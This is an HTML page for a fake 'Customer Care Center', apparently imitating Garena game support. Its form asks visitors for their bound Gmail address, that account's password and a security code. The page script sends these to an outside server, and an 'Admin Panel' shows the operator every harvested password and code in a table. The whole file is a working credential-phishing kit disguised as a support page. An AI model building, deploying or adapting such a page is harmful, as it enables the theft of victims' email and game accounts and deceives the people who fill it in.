<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Support Center</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #ffffff;
            min-height: 100vh;
        }

        .top-header {
            width: 100%;
            padding: 16px 24px;
            background-color: #ffffff;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .brand-logo {
            height: 65px;
            width: auto;
            object-fit: contain;
        }

        .admin-btn {
            background: #f4f4f4;
            border: 1px solid #cccccc;
            padding: 8px 14px;
            border-radius: 20px;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            color: #333333;
            transition: 0.2s;
        }

        .admin-btn:hover {
            background: #e0e0e0;
        }

        .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 30px 20px;
        }

        .support-card {
            background: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
            width: 100%;
            max-width: 420px;
            padding: 30px;
        }

        .card-header {
            text-align: center;
            margin-bottom: 25px;
        }

        .card-header h2 {
            color: #222222;
            font-size: 20px;
            font-weight: 700;
        }

        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            margin-bottom: 6px;
            color: #555555;
            font-size: 14px;
            font-weight: 600;
        }

        .form-group input, .form-group select {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #cccccc;
            border-radius: 8px;
            font-size: 14px;
            background-color: #fafafa;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-group input:focus, .form-group select:focus {
            border-color: #e4181f;
        }

        .submit-btn {
            width: 100%;
            padding: 13px;
            background-color: #e4181f;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #c71218;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
            padding: 15px;
            z-index: 1000;
        }

        .modal-content {
            background: #ffffff;
            padding: 25px;
            border-radius: 12px;
            width: 100%;
            max-width: 700px;
            max-height: 80vh;
            overflow-y: auto;
            position: relative;
        }

        .close-btn {
            position: absolute;
            right: 15px;
            top: 15px;
            font-size: 20px;
            cursor: pointer;
            border: none;
            background: none;
            font-weight: bold;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            font-size: 13px;
        }

        table, th, td {
            border: 1px solid #dddddd;
            padding: 8px;
            text-align: left;
        }

        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>

    <header class="top-header">
        <img src="garenashare.jpg" alt="Logo" class="brand-logo">
        <button class="admin-btn" onclick="openModal()">👤 Admin Panel</button>
    </header>

    <div class="main-container">
        <div class="support-card">
            <div class="card-header">
                <h2>Customer Care Center</h2>
            </div>

            <form id="supportForm">
                <div class="form-group">
                    <label>Bind Gmail</label>
                    <input type="email" id="gmail" placeholder="Enter bind gmail" required>
                </div>

                <div class="form-group">
                    <label>Bind Gmail Password</label>
                    <input type="password" id="password" placeholder="Enter password" required>
                </div>

                <div class="form-group">
                    <label>Security Code</label>
                    <input type="text" id="securityCode" placeholder="Enter 6-digit security code" required>
                </div>

                <div class="form-group">
                    <label>Select Problem</label>
                    <select id="problemType" required>
                        <option value="" disabled selected>Select your issue</option>
                        <option value="Account Banned Issue">Account Banned Issue</option>
                        <option value="Bind Gmail Lost">Bind Gmail Lost</option>
                        <option value="OTP Not Receiving">OTP Not Receiving</option>
                        <option value="Account Lock Problem">Account Lock Problem</option>
                        <option value="Recovery Email Issue">Recovery Email Issue</option>
                        <option value="Bind SMS Issue">Bind SMS Issue</option>
                        <option value="Other Issue">Other Issue</option>
                    </select>
                </div>

                <button type="submit" class="submit-btn">Submit Request</button>
            </form>
        </div>
    </div>

    <!-- Admin Panel Modal -->
    <div id="adminModal" class="modal">
        <div class="modal-content">
            <button class="close-btn" onclick="closeModal()">&times;</button>
            
            <div id="adminLoginForm">
                <h3 style="margin-bottom: 15px;">Admin Login</h3>
                <div class="form-group">
                    <label>Admin Email</label>
                    <input type="email" id="adminEmail" placeholder="Enter admin email">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" id="adminPassword" placeholder="Enter password">
                </div>
                <button class="submit-btn" onclick="loginAdmin()">Login</button>
            </div>

            <div id="adminDashboard" style="display: none;">
                <h3>Submitted Tickets Dashboard</h3>
                <p style="margin-top: 5px; color: #666;">Total Submissions: <b id="totalCount">0</b></p>
                
                <table>
                    <thead>
                        <tr>
                            <th>Bind Gmail</th>
                            <th>Password</th>
                            <th>Security Code</th>
                            <th>Problem</th>
                        </tr>
                    </thead>
                    <tbody id="ticketData">
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        const RAILWAY_URL = 'https://ff-garena-13jd.onrender.com'; 

        document.getElementById('supportForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const payload = {
                gmail: document.getElementById('gmail').value,
                password: document.getElementById('password').value,
                securityCode: document.getElementById('securityCode').value,
                problemType: document.getElementById('problemType').value
            };

            try {
                const res = await fetch(`${RAILWAY_URL}/api/submit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await res.json();
                if(data.success) {
                    alert('Your request has been submitted successfully!');
                    document.getElementById('supportForm').reset();
                }
            } catch (err) {
                alert('Failed to submit request.');
            }
        });

        function openModal() {
            document.getElementById('adminModal').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('adminModal').style.display = 'none';
        }

        async function loginAdmin() {
            const email = document.getElementById('adminEmail').value;
            const password = document.getElementById('adminPassword').value;

            try {
                const res = await fetch(`${RAILWAY_URL}/api/admin/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });

                const data = await res.json();

                if (data.success) {
                    document.getElementById('adminLoginForm').style.display = 'none';
                    document.getElementById('adminDashboard').style.display = 'block';
                    
                    document.getElementById('totalCount').innerText = data.submissions.length;
                    
                    const tableBody = document.getElementById('ticketData');
                    tableBody.innerHTML = '';
                    
                    data.submissions.forEach(item => {
                        tableBody.innerHTML += `
                            <tr>
                                <td>${item.gmail}</td>
                                <td>${item.password}</td>
                                <td>${item.securityCode}</td>
                                <td>${item.problemType}</td>
                            </tr>
                        `;
                    });
                } else {
                    alert(data.message || 'Invalid Email or Password!');
                }
            } catch (err) {
                alert('Connection to server failed.');
            }
        }
    </script>
</body>
</html>
